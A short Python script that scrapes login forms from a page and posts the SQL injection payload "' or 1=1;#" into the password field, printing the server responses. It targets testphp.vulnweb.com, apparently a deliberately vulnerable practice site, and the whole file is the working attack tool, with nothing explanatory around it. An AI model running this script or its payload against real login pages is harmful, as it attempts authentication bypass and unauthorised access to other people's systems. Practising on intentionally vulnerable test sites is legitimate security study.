import requests
from pprint import pprint
from bs4 import BeautifulSoup

r = requests.session()

def FindForms(url):
    r = requests.get(url)
    soup = BeautifulSoup(r.content, 'html.parser')
    forms = soup.find_all('form')
    forms_with_info = []
    for form in forms:
        form_data = {}
        form_data["inputs"] = []
        for input_ in form.find_all('input'):
            if input_['type'] == 'text' or input_['type'] == 'password':
                form_data['inputs'].append(input_)

        forms_with_info.append({"action": form['action'], "inputs": form_data['inputs']})

    return forms_with_info


def HandleScrapedForm(url, form_data, input_):
    responses = []
    for form in form_data:
        data = {}
        for _input in form['inputs']:
            if _input['name'] == input_:
                data[_input['name']] = "' or 1=1;#"
            else:
                data[_input['name']] = 'testtest'

        pprint(data)
        print('-'*50)
        res = r.post(url+form['action'], data=data)
        responses.append(res)
    
    return responses

if __name__ == '__main__':
    url = 'http://testphp.vulnweb.com/login.php'
    form_data = FindForms(url)
    for res in HandleScrapedForm(url=url, form_data=form_data, input_='pass'):
        print(res.content)
